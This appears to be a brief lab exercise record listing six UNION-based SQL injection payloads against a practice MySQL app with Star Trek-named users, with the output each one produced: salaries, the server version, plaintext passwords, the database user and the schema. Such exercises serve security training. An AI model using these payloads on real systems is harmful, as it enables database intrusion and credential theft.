1. ' UNION SELECT username, salary FROM users -- Результат:
Username	Salary
james_kirk	25000
mr_spock	99000
leonard_mccoy	45000
nyota_uhura	39000
montgomery_scott	1250
hiraku_sulu	3500
pavel_chekov	2500
2. ' UNION SELECT 1, @@version --
Username	Salary
1	8.3.0
3. ' UNION SELECT username, password FROM users --
Username	Salary
james_kirk	kobayashi_maru
mr_spock	0nlyL0g!c
leonard_mccoy	hesDEADjim!
nyota_uhura	StarShine
montgomery_scott	ScottyDoesntKnow
hiraku_sulu	parking-break-on
pavel_chekov	99victorvictor2
4. ' UNION SELECT 1, USER() --
Username	Salary
1	john_harrison@172.18.0.3
5. ' UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema = database() --
Username	Salary
users	1
6. ' UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name = 'users' AND table_schema = database() --
Username	Salary
username	1
first_name	1
last_name	1
password	1
salary	1
